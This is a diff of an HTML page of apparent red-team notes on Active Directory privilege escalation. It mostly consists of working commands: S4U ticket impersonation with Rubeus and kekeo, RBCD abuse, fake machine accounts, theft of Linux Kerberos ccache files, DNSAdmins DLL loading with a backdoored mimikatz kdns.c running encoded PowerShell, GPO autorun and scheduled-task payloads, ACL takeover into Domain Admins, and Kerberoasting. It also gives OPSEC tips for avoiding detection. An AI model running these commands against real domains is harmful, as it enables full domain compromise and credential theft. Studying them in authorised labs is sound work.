+<p>Once we have the TGT, we can request TGS with a S4U request.</p>
+
+<ul>
+  <li><strong>kekeo</strong>:</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kekeo # tgs::s4u /tgt:TGT_websvC@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local|host/dcorp-mssql.dollarcorp.moneycorp.local
+
+</code></pre></div></div>
+
+<ul>
+  <li><strong>Rubeus</strong>:</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe s4u /user:DCORP-ADMINSRV<span class="nv">$ </span>/rc4:5e77978a734e3a7f3895fb0fdbda3b96 <span class="o">[</span>/aes256:XXXX] /impersonateuser:Administrator /msdsspn:<span class="s2">"TIME/dcorp-dc.dollarcorp.moneycorp.local"</span> /altservice:LDAP /ticket:[b64-ticket]
 </code></pre></div></div>
 
 <blockquote>
   <p><strong>Note</strong>: The delegation occurs not only for the specified service but for any service running under the same account. The is no validation for the SPN specified.</p>
 </blockquote>
 
+<h4 id="inject-tgs">Inject TGS</h4>
+
+<p>Finally with mimikatz we can inject the ticket on the current session:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe ptt /ticket:TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_host~dcorp-mssql.dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi
+</code></pre></div></div>
+<p>It is also possible to create a process with that Tiket in order to impersonate or steal the token with CobaltStrike.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe \domain:DEV /username:Administrator /password:FakePass /ticket&lt;base64&gt;
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note</strong>: If we have Constrained delegation on the DC we can ask to the <code class="highlighter-rouge">LDAP TGS</code> in order to do a <code class="highlighter-rouge">DCSync attack</code>.</p>
+</blockquote>
+
+<h3 id="abusing-s4u2self-extension">Abusing S4U2self extension</h3>
+
+<p>Machines do not get remote local admin access to themserlver over CIFS, but we can abuse S4U2self to obtain a TGS to itself, as a user we know is a local admin</p>
+
+<p>If we obtain a TGT for a computer (there are different ways to obtain it without being admin for example using the Printer Bug), we can craft a TGS for CIFS using the alternative service.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:CIFS/WRKSTN-1.corp.local /user:WRKSTN-1$ /ticket:[B64_TGT_SRKSTN-1]
+</code></pre></div></div>
+<p>Finally inject the TGS in memory and access to CIFS service.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls \\wrkstn-1.corp.local\c$
+</code></pre></div></div>
+<blockquote>
+  <p><strong>Note</strong>: Make sure to use FQDN.</p>
+</blockquote>
+
+<h2 id="mitigation-1">Mitigation</h2>
+
+<p>It is recommended to:</p>
+
+<ul>
+  <li>Limit DA/Admin logins to specific servers.</li>
+  <li>Set <code class="highlighter-rouge">Account is sensitive and cannot be delegated</code> flag for privileged accounts.</li>
+</ul>
+
+<h2 id="rersource-based-constrained-delegation-rbcd">Rersource-Based Constrained Delegation (RBCD)</h2>
+
+<p>To enable <strong>constrained</strong> or <strong>unsconstrained</strong> delegation on a computer requires the <code class="highlighter-rouge">SeEnableDelegationPrivilege</code> user right assignment on domain controllers, which is only granted to enterprise and domain admins.</p>
+
+<p>Windows 2012 introduced a new type of delegation called <strong>resource-based constrained delegation (RBCD)</strong>, which allows the delegation configuration to be set on the target rather than the source.</p>
+
+<p>Constrained Delegation is configured on the front-end service via the <code class="highlighter-rouge">msDS-AllowedToDelegateTo</code> attribute an example could be <code class="highlighter-rouge">CIFS/dc-2.corp.local</code> was in the <code class="highlighter-rouge">msDS-AllowedToDelegateTo</code> attribute of <code class="highlighter-rouge">SQL-2</code>, which allows <code class="highlighter-rouge">SQL-2</code> computer account to impersonate any user to any service on <code class="highlighter-rouge">dc-2</code>.</p>
+
+<p>RBCD reverses this concept and puts control in the hands of the backend via the new attribute called <code class="highlighter-rouge">msDS-AllowedToActOnBehalfOfTheIdentity</code>. This attribute also does not require the <code class="highlighter-rouge">SeEnableDelegationPrivilege</code> to modify. You only need a privilege like <code class="highlighter-rouge">WriteProperty</code>, <code class="highlighter-rouge">GenericAll</code>, <code class="highlighter-rouge">GenericWrite</code> or <code class="highlighter-rouge">WriteDacl</code> on a computer object.</p>
+
+<blockquote>
+  <p><strong>Note</strong>: We are going to abuse <code class="highlighter-rouge">WriteProperty</code>, <code class="highlighter-rouge">GenericAll</code>, <code class="highlighter-rouge">GenericWrite</code> or <code class="highlighter-rouge">WriteDacl</code> rights on a computer to add RBCD delegation attribute, then perform S4U and compromise the target machine.</p>
+</blockquote>
+
+<blockquote>
+  <p><strong>Note</strong>: See the <code class="highlighter-rouge">ObjectAceType</code> to make sure that we have <code class="highlighter-rouge">WritePoperty</code> rights in all properties (<code class="highlighter-rouge">All</code>)</p>
+</blockquote>
+
+<ul>
+  <li>PowerView (dev):
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs |  ?<span class="o">{</span><span class="nv">$_</span>.ActiveDirectoryRights -match <span class="s2">"WriteProperty|GenericWrite|GenericAll|WriteDacl"</span> -and <span class="nv">$_</span>.SecurityIdentifier -match <span class="s2">"S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}"</span><span class="o">}</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>We need to use a computer account, we can use one we have compromised or we can join a fake one to the domain.</p>
+
+<p>To start the attack, we need it SID.</p>
+
+<ul>
+  <li>PowerView (dev):
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainComputer -Identity WKSTN-2 -Properties objectSid
+</code></pre></div>    </div>
+    <p>We will need to create a security descriptor with this SID:</p>
+  </li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$rsd</span> <span class="o">=</span> <span class="nb">New-Object </span>Security.AccessControl.RawSecurityDescriptor <span class="s2">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"</span>
+<span class="nv">$rsdb</span> <span class="o">=</span> <span class="nb">New-Object </span><span class="kt">byte</span><span class="o">[]</span> <span class="o">(</span><span class="nv">$rsd</span>.BinaryLength<span class="o">)</span>
+<span class="nv">$rsd</span>.GetBinaryForm<span class="o">(</span><span class="nv">$rsdb</span>, 0<span class="o">)</span>
+</code></pre></div></div>
+<p>And finally modify its property <code class="highlighter-rouge">msDS-AllowdToActOnBehalfOfOtherIdentity</code>.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainComputer -Identity <span class="s2">"dc-2"</span> | <span class="nb">Set</span>-DomainObject -Set @<span class="o">{</span><span class="s1">'msDS-AllowedToActOnBehalfOfOtherIdentity'</span> <span class="o">=</span> <span class="nv">$rsdb</span><span class="o">}</span> -Verbose
+</code></pre></div></div>
+
+<p>One-liner command:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
+</code></pre></div></div>
+
+<p>Next, we can use our compromised machine account to perform S4U impersonation with Rubeus. The <code class="highlighter-rouge">s4u</code> command requires a TGT,RC4 or AES hash. Since we have elevated access to that machine account, we can extract a TGT from memory.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe triage
+.\Rubeus.exe dump /luid:0x3e5 /service:krbtgt /nowrap
+</code></pre></div></div>
+<p>Then perform the S4U.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe s4u /user:WKSTN-2<span class="nv">$ </span>/impersonateuser:administrator /msdsspn:cifs/dc-2.corp.local /ticket:&lt;base64ticket&gt; /nowrap
+</code></pre></div></div>
+<p>Finally pass the ticket into a logon session for use.</p>
+
+<blockquote>
+  <p><strong>Note</strong>: To clear up, remove the <code class="highlighter-rouge">msDS-AllowdToActOnBehalfOfOtherIdentity</code> entry:</p>
+
+  <p><code class="highlighter-rouge">Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity</code></p>
+</blockquote>
+
+<h3 id="creating-a-computer-object">Creating a computer object</h3>
+
+<p>By default, every domain user can join up to 10 computers to the domain, this is specified on the <code class="highlighter-rouge">ms-DS-MachineAccountQuota</code> attribute of the domain object.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainObject -Identity <span class="s2">"DC=corp,DC=local"</span> -Properties ms-DS-MachineAccountQuota
+</code></pre></div></div>
+<p>We can use <code class="highlighter-rouge">StandIn</code> to create a computer with a random password.</p>
+
+<ul>
+  <li><a href="https://github.com/FuzzySecurity/StandIn">https://github.com/FuzzySecurity/StandIn</a></li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\StandIn.exe --computer FakeComputer --make
+
+<span class="o">[</span>?] <span class="k">Using </span>DC    : dc-2.corp.local
+    |_ Domain   : corp.local
+    |_ DN       : <span class="nv">CN</span><span class="o">=</span>FakeComputer,CN<span class="o">=</span>Computers,DC<span class="o">=</span>corp,DC<span class="o">=</span><span class="nb">local</span>
+    |_ Password : oIrpupAtF1YCXaw
+
+<span class="o">[</span>+] Machine account added to AD..
+</code></pre></div></div>
+<p>With Rubeus we can calculate their hashes.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe <span class="nb">hash</span> /password:oIrpupAtF1YCXaw /user:FakeComputer<span class="nv">$ </span>/domain:corp.local
+</code></pre></div></div>
+<p>Finally you can ask for a TGT.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe asktgt /user:FakeComputer<span class="nv">$ </span>/aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap
+</code></pre></div></div>
+<h1 id="linux-credential-cache">Linux Credential Cache</h1>
+
+<p><strong>Kerberos Credential Cache (ccache)</strong> ffiles contains the kerberos credentials for a user authenticated to a domain-joined Linux machine, often a cached TGT. If we can compromise a machine, we can extract the ccache of any authenticated user and use it to request a TGS for any other service in the domain.</p>
+
+<p>The <code class="highlighter-rouge">ccache</code> files are stored in <code class="highlighter-rouge">/tmp</code> and are prefixed with <code class="highlighter-rouge">krb5cc</code></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@linux-1:~$ ls -l /tmp/
+total 20
+-rw------- 1 user          domain users 1342 Mar  9 15:21 krb5cc_1234201102_MefMnG
+-rw------- 1 administrator domain users 1341 Mar  9 15:33 krb5cc_1234201107_NttioD
+</code></pre></div></div>
+<p>Only a the user and root can read the ccache file, so we will need full access to the system.</p>
+
+<p>With <code class="highlighter-rouge">impacket-ticketConverter</code> we can convert the ticket from <code class="highlighter-rouge">ccache</code> to <code class="highlighter-rouge">kirbi</code> format.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-ticketConverter krb5cc_1234201102_MefMnG user.kirbi
+</code></pre></div></div>
+<p>Finally we just need to inject it into memory.</p>
+
 <h1 id="dnsadmins">DNSAdmins</h1>
 
 <p>It is possible for the members of the <strong>DNSAdmins</strong> group to load arbitrary DLL with the privileges of dns.exe which is <code class="highlighter-rouge">NT AUTHORITY\SYSTEM</code>.</p>
 
 <p>In case the domain controllers also serves as DNS, this will provide us escalation to domain admin. We just need privileges to restart the DNS service.</p>
+
+<blockquote>
+  <p><strong>Note</strong>: By default does not have the privileges to restart the DNS service.</p>
+</blockquote>
 
 <p>Enumerate the <code class="highlighter-rouge">DNSAdmins</code> group:</p>
 
@@ -564,10 +938,17 @@ tgt::ask /user:websvc /domain
 
 <ul>
   <li>dnscmd.exe:
-    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnscmd dc01 /config /serverlevelplugindll \\10.10.10.10\share\mimilib.dll
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnscmd.exe dc01 /config /serverlevelplugindll \\10.10.10.10\share\mimilib.dll
 </code></pre></div>    </div>
   </li>
-  <li>DNSServer:
+</ul>
+
+<blockquote>
+  <p><strong>Note</strong>: If <code class="highlighter-rouge">dnscmd</code> is not available, you can install <code class="highlighter-rouge">DNS Server</code> on the Server Manager.</p>
+</blockquote>
+
+<ul>
+  <li>DNSServer Module (RSAT DNS):
     <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$dnsettings = Get-DnsServerSetting -ComputerName dc01 -Verbose -All
 $dnsettings.ServerLevelPluginDll = "\\10.10.10.10\share\mimilib.dll"
 Set-DnsServerSetting -InputObject $dnsettings -ComputerName dc01 -Verbose
@@ -577,26 +958,409 @@ Set-DnsServerSetting -InputObject $dnsettings -ComputerName dc01 -Verbose
 
 <p>We need to restart the service:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc \\dc01.corp.local stop dns
-sc \\dc01.corp.local start dns
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc.exe \\dc01.corp.local stop dns
+sc.exe \\dc01.corp.local start dns
 </code></pre></div></div>
 
 <p>By default <code class="highlighter-rouge">mimilib.dll</code> logs all DNS queries on the following file:</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\windows\sytem32\kiwidns.log
 </code></pre></div></div>
 
-<p>We can modify the source code of <code class="highlighter-rouge">kdns.c</code> from <code class="highlighter-rouge">mimikatz</code> in order to add a reverse shell or other type of backdoor.</p>
+<p>We can modify the source code of <code class="highlighter-rouge">kdns.c</code> from <code class="highlighter-rouge">mimikatz</code> source code in order to add a reverse shell or other type of backdoor.</p>
 
-<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#pragma warning(disable:4996)
-</span>	<span class="k">if</span><span class="p">(</span><span class="n">kdns_logfile</span> <span class="p">=</span> <span class="nf">_wfopen</span><span class="p">(</span><span class="n">L</span><span class="s">"kiwidns.log"</span><span class="p">,</span> <span class="n">L</span><span class="s">"a"</span><span class="p">))</span>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#pragma warning(disable:4996)
+</span>	<span class="k">if</span><span class="p">(</span><span class="n">kdns_logfile</span> <span class="o">=</span> <span class="n">_wfopen</span><span class="p">(</span><span class="s">L"kiwidns.log"</span><span class="p">,</span> <span class="s">L"a"</span><span class="p">))</span>
 <span class="cp">#pragma warning(pop)
 </span>	<span class="p">{</span>
-		<span class="nf">klog</span><span class="p">(</span><span class="n">kdns_logfile</span><span class="p">,</span> <span class="n">L</span><span class="s">"%S (%hu)\n"</span><span class="p">,</span> <span class="n">pszQueryName</span><span class="p">,</span> <span class="n">wQueryType</span><span class="p">);</span>
-		<span class="nf">fclose</span><span class="p">(</span><span class="n">kdns_logfile</span><span class="p">);</span>
-		<span class="nf">system</span><span class="p">(</span><span class="s">"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -e ZQBjAGgAbwAgACIAdABlAHMAdAAiAA=="</span><span class="p">)</span>   <span class="c1">//THIS LINE</span>
+		<span class="n">klog</span><span class="p">(</span><span class="n">kdns_logfile</span><span class="p">,</span> <span class="s">L"%S (%hu)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pszQueryName</span><span class="p">,</span> <span class="n">wQueryType</span><span class="p">);</span>
+		<span class="n">fclose</span><span class="p">(</span><span class="n">kdns_logfile</span><span class="p">);</span>
+		<span class="n">system</span><span class="p">(</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">WindowsPowerShell</span><span class="se">\\</span><span class="s">v1.0</span><span class="se">\\</span><span class="s">powershell.exe -e ZQBjAGgAbwAgACIAdABlAHMAdAAiAA=="</span><span class="p">)</span>   <span class="c1">//THIS LINE</span>
 	<span class="p">}</span>
 	<span class="k">return</span> <span class="n">ERROR_SUCCESS</span><span class="p">;</span>
 </code></pre></div></div>
+
+<blockquote>
+  <p><strong>RedTeam Note</strong>: If we put a reverse shell on the <code class="highlighter-rouge">mimilib.dll</code>, <strong>DNS will not work properly since the reverse shell is closed</strong>. Use another way to elevate privileges such as add the user to local administrators group.</p>
+</blockquote>
+
+<h2 id="restore-config">Restore config</h2>
+
+<p>After execute the attack we need to restore the previous config, so we need to remove the <code class="highlighter-rouge">ServerLevelPlugin</code> from the DNS Parameters registry.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query \\dc01\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+reg delete \\dc01\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
+sc.exe \\dc01 stop dns
+sc.exe \\dc01 <span class="nb">start </span>dns
+</code></pre></div></div>
+
+<h1 id="group-policy">Group Policy</h1>
+
+<p>Group Policy is the central repository in a forest or domain that controls the configuration of computers and users. Group Policy Objects (GPOs) are sets of configurations that are applied to Organisational Units (OUs).</p>
+
+<h2 id="identifying-access-to-gpos">Identifying Access to GPOs</h2>
+
+<p>By default, only Domain Admins can create GPOs and link them to OUs but it´s common practice to delegate those rights to other teams.</p>
+
+<h3 id="modifying-an-existing-gpo">Modifying an existing GPO</h3>
+
+<p>This query will return any GPO in the domain, where a 4-digit RID has WriteProperty, WriteDacl or WriteOwner. Filtering on a 4-digit RID is a quick way to eliminate the default 512, 519, etc results.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? <span class="o">{</span> <span class="nv">$_</span>.ActiveDirectoryRights -match <span class="s2">"CreateChild|WriteProperty|WriteDacl|WriteOwner"</span> -and <span class="nv">$_</span>.SecurityIdentifier -match <span class="s2">"S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}"</span> <span class="o">}</span> | <span class="nb">select </span>ObjectDN, ActiveDirectoryRights, SecurityIdentifier | <span class="nb">fl</span>
+</code></pre></div></div>
+<p>We can resolve the ObjectDN with:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainGPO -Name <span class="s2">"{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}"</span> -Properties DisplayName
+</code></pre></div></div>
+
+<h3 id="create-and-link-a-gpo-to-a-ou">Create and Link a GPO to a OU</h3>
+
+<ul>
+  <li>SIDs of principals that can create new GPOs (PowerView-dev)</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainObjectAcl -SearchBase <span class="s2">"CN=Policies,CN=System,DC=corp,DC=local"</span> -ResolveGUIDs | ? <span class="o">{</span> <span class="nv">$_</span>.ObjectAceType -eq <span class="s2">"Group-Policy-Container"</span> <span class="o">}</span> | <span class="nb">select </span>ObjectDN, ActiveDirectoryRights, SecurityIdentifier | <span class="nb">fl</span>
+</code></pre></div></div>
+<ul>
+  <li>SIDs of principals that can write to the GP-Link attribute on OUs (PowerView-dev)</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? <span class="o">{</span> <span class="nv">$_</span>.ObjectAceType -eq <span class="s2">"GP-Link"</span> -and <span class="nv">$_</span>.ActiveDirectoryRights -match <span class="s2">"WriteProperty"</span> <span class="o">}</span> | <span class="nb">select </span>ObjectDN, SecurityIdentifier | <span class="nb">fl</span>
+</code></pre></div></div>
+
+<p>If we can create new GPOs and link it to a OU, we can access to those servers.</p>
+
+<h2 id="remote-server-administration-tools-rsat">Remote Server Administration Tools (RSAT)</h2>
+
+<p>RSAT is a management component provided by Microsoft to help manage components in a domain. The GroupPolicy module has several cmdlets that can be used for administering GPOs.</p>
+
+<ul>
+  <li>Check if GroupPolicy is installed:</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Module -List -Name GroupPolicy | <span class="nb">select</span> -expand ExportedCommands
+</code></pre></div></div>
+
+<ul>
+  <li>Install it by local admin:</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Install-WindowsFeature</span> –Name GPMC
+</code></pre></div></div>
+
+<ul>
+  <li>Create a GPO and link it to a OU:</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>New-GPO -Name <span class="s2">"Evil GPO"</span> | New-GPLink -Target <span class="s2">"OU=Workstations,DC=corp,DC=local"</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>OPSEC Alert</strong>: GPO name will be visible, try to use a name that is “convincing”</p>
+</blockquote>
+
+<p>If we are able to write anything, anywhere into the HKLM or HKCU hives, prsents different options for achieving code execution. The simplest way is to create a new autorun value to execute a payload on boot.</p>
+
+<ul>
+  <li>Find writeable whare with PowerView</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Find-DomainShare -CheckShareAccess
+</code></pre></div></div>
+
+<ul>
+  <li>Modify the GPO:</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-GPPrefRegistryValue -Name <span class="s2">"Evil GPO"</span> -Context Computer -Action Create -Key <span class="s2">"HKLM\Software\Microsoft\Windows\CurrentVersion\Run"</span> -ValueName <span class="s2">"Updater"</span> -Value <span class="s2">"C:\Windows\System32\cmd.exe /c \\srv\share\payload.exe"</span> -Type ExpandString
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>OPSEC Alert</strong>: This leaves a Command Prompt on the screen, a better way could be <code class="highlighter-rouge">%COMSPEC% /b /c start /b /min</code>.</p>
+</blockquote>
+
+<h2 id="sharpgpoabuse">SharpGPOAbuse</h2>
+
+<p><code class="highlighter-rouge">SharpGPOAbuse</code> allows a wider range of abusive configurations to be added to as GPO. It cannot create GPO, so it will must be created with the RSAT or modify one we already have write access to.</p>
+
+<p>Example of adding an Immediate Scheduled Task too the PowerShell Logging GPO.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\SharpGPOAbuse.exe --AddComputerTask --TaskName <span class="s2">"Install Updates"</span> --Author NT AUTHORITY\SYSTEM --Command <span class="s2">"%COMSPEC%"</span> --Arguments <span class="s2">"/b /c start /b /min \\srv\share\payload.exe"</span> --GPOName <span class="s2">"PowerShell Logging"</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note</strong>: We can wait to the GPO refresh or manually run <code class="highlighter-rouge">gpupdate /force</code> on the target.</p>
+</blockquote>
+
+<h1 id="abusing-acls">Abusing ACLs</h1>
+
+<p>There may be instances across the domain where some principals have ACLs on more privileged accounts, that allow them to be abused for account-takeover.</p>
+
+<p>Search ACLs of a principal.</p>
+
+<ul>
+  <li>PowerView (dev):</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainObjectAcl -Identity user | ? <span class="o">{</span> <span class="nv">$_</span>.ActiveDirectoryRights -match <span class="s2">"GenericAll|WriteProperty|WriteDacl"</span> -and <span class="nv">$_</span>.SecurityIdentifier -match <span class="s2">"S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}"</span> <span class="o">}</span> | <span class="nb">select </span>SecurityIdentifier, ActiveDirectoryRights | <span class="nb">fl</span>
+</code></pre></div></div>
+<p>Search ACLs on the entire Domain.</p>
+
+<ul>
+  <li>PowerView (dev):</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainObjectAcl -SearchBase <span class="s2">"CN=Users,DC=dev,DC=cyberbotic,DC=io"</span> | ? <span class="o">{</span> <span class="nv">$_</span>.ActiveDirectoryRights -match <span class="s2">"GenericAll|WriteProperty|WriteDacl"</span> -and <span class="nv">$_</span>.SecurityIdentifier -match <span class="s2">"S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}"</span> <span class="o">}</span> | <span class="nb">select </span>ObjectDN, ActiveDirectoryRights, SecurityIdentifier | <span class="nb">fl</span>
+</code></pre></div></div>
+<h2 id="reset-user-password">Reset User Password</h2>
+
+<p>If we have <code class="highlighter-rouge">GenericAll</code> we can change the password of a user.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user bob Password! /domain
+</code></pre></div></div>
+
+<h2 id="modify-domain-group-membership">Modify Domain Group Membership</h2>
+
+<p>We can add users to a group.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net <span class="nb">group</span> <span class="s2">"Domain Admins"</span> bob /add /domain
+</code></pre></div></div>
+<h2 id="set-spn-kerberoasting">Set SPN (Kerberoasting)</h2>
+
+<p>With enough privileges such as <code class="highlighter-rouge">GenericAll</code> or <code class="highlighter-rouge">GenericWrite</code>, a target user’s SPN can be set to anything which is unique in the domain. We can then request a TGS without special privileges and the TGS can be kerberoasted.</p>
+
+<p>We can enumerate the permissions for a group on ACLs:</p>
+
+<ul>
+  <li>PowerView:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-ACLScanner -ResolveGUIDs | ?<span class="o">{</span><span class="nv">$_</span>.IdentityReferenceName -match <span class="s2">"RDPUsers"</span><span class="o">}</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>We can also see if a user already has a SPN:</p>
+
+<ul>
+  <li>PowerView (dev):
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainUser -Identity user01 | <span class="nb">select </span>serviceprincipalname
+</code></pre></div>    </div>
+  </li>
+  <li>ADModule:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ADUser</span> -Identity user01 -Properties ServicePrincipalName | <span class="nb">select </span>ServicePrincipalName
+</code></pre></div>    </div>
+    <p>And we can force the SPN to a user:</p>
+  </li>
+  <li>PowerView (dev):
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-DomainObject -Identity user01 -Set @<span class="o">{</span><span class="nv">serviceprincipalname</span><span class="o">=</span><span class="s1">'ops/whatever01'</span><span class="o">}</span>
+</code></pre></div>    </div>
+  </li>
+  <li>ADModule:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set-ADUser</span> -Identity user01 -ServicePrincipalNames @<span class="o">{</span><span class="nv">Add</span><span class="o">=</span><span class="s1">'ops/whatever01'</span><span class="o">}</span>
+</code></pre></div>    </div>
+    <p>Once we have a SPN set, we can request a TGS:</p>
+  </li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Add-Type</span> -AssemblyName System.IdentityModel
+<span class="nb">New-Object </span>Sytem.IdentityModel.Token.KerberosRequestorSecurityToken -ArgumentList <span class="s2">"ops/whatever01"</span>
+</code></pre></div></div>
+<p>And we can export the tickets to the disk:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Inovoke-Mimikatz -Command <span class="s1">'"kerberos::list /export"'</span>
+</code></pre></div></div>
+<p>And finally same as <em>Kerberoasting</em>, you can crack the ticket with <code class="highlighter-rouge">tgsrepcrack.py</code>.</p>
+
+<h2 id="disable-preauth-of-a-user-asreproasting">Disable PreAuth of a User (ASREPRoasting)</h2>
+
+<p>A user with <code class="highlighter-rouge">GenericAll</code> or <code class="highlighter-rouge">GenericWrite</code>, kerberos preauth can be disabled.</p>
+
+<ul>
+  <li>PowerView (dev):
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-DomainObject -Identity user01 -XOR @<span class="o">{</span><span class="nv">useraccountcontrol</span><span class="o">=</span>4194304<span class="o">}</span> -Verbose
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h1 id="across-domains-sid-history">Across Domains (SID History)</h1>
+
+<p>Domains in a same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains.</p>
+
+<p>There are two ways of escalating privileges between two domains of the same forest:</p>
+
+<ul>
+  <li>Trust Tickets</li>
+  <li>Krbtgt hash</li>
+</ul>
+
+<h2 id="child-to-parent-using-trust-tickets">Child to Parent using Trust Tickets</h2>
+
+<p>We can escalate between domains using the trust tickets. An <strong>inter-realm TGT</strong> can be forged:</p>
+
